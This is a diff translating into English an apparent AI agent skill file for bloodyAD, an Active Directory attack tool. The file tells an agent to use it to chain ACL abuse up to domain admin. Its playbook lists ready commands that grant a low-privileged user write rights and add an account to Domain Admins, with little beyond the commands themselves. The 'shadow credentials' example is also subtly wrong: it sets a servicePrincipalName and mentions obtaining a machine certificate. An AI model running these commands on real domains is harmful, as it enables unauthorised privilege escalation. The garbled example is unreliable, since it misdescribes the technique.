@@ -2,47 +2,50 @@
 name: bloodyad-ad-privesc
 description: "bloodyAD: abuses ACLs for escalation chains, GenericWrite to shadow credentials. Signals: ad attack, domain pentest, read ACL, add delegation/write permissions"
 zh-signals: "bloodyAD: ACL 滥用提权链、GenericWrite→影子凭证。信号:ad攻击,域渗透,读 ACL,加委派/写权限。"
+when-to-use: >-
+  Use during Active Directory pentests to abuse ACLs such as write permissions,
+  delegation, and shadow credentials, chaining escalation to domain admin.
 ---
 
 # bloodyAD
 
-- 攻击大类:C30 AD域渗透与域控攻击
-- 上游仓库:https://github.com/CravateRouge/bloodyAD
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C30 AD Domain Penetration and Domain Controller Attacks
+- Upstream Repository: https://github.com/CravateRouge/bloodyAD
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 pip install bloodyAD
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `-d corp.local -u user -p pass --host dc01 get object 'DC=corp,DC=local' --attr nTSecurityDescriptor` | 读 ACL |
-| `add dacl ...` | 加委派/写权限 |
-| `set object user accountenabled true` | 启用账号 |
-| `get child --type User` | 列子对象 |
-| `-k` | Kerberos 票据 |
-| `--dc-ip 10.0.0.5` | 指定 DC |
+| `-d corp.local -u user -p pass --host dc01 get object 'DC=corp,DC=local' --attr nTSecurityDescriptor` | Read ACL |
+| `add dacl ...` | Add delegation/write permissions |
+| `set object user accountenabled true` | Enable the account |
+| `get child --type User` | List child objects |
+| `-k` | Kerberos ticket |
+| `--dc-ip 10.0.0.5` | Specify the DC |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### ACL 滥用提权链
+### ACL abuse escalation chain
 
 ```bash
 bloodyAD -d corp.local -u lowuser -p pass --host dc01 add dacl "OU=IT,DC=corp,DC=local" lowuser WriteMembers
-bloodyAD -d corp.local -u lowuser -p pass --host dc01 add groupMember "CN=Domain Admins,CN=Users,DC=corp,DC=local" victim  # 写入组即提权
+bloodyAD -d corp.local -u lowuser -p pass --host dc01 add groupMember "CN=Domain Admins,CN=Users,DC=corp,DC=local" victim  # writing to the group is privilege escalation
 ```
 
-### GenericWrite→影子凭证
+### GenericWrite to shadow credentials
 
 ```bash
 bloodyAD -d corp.local -u user -p pass --host dc01 set object target servicePrincipalName
-# 再跑 PKINITtools 拿机器账户证书
+# then run PKINITtools to obtain the machine account certificate
 ```
 
-## 注意事项
+## Notes
 
-直接 LDAP 操作 DACL/属性和证书;AD 权限提升瑞士刀,语法比原生 PowerView 干净。
+Operates on DACLs, attributes, and certificates directly over LDAP; the Swiss army knife of AD privilege escalation, with cleaner syntax than native PowerView.
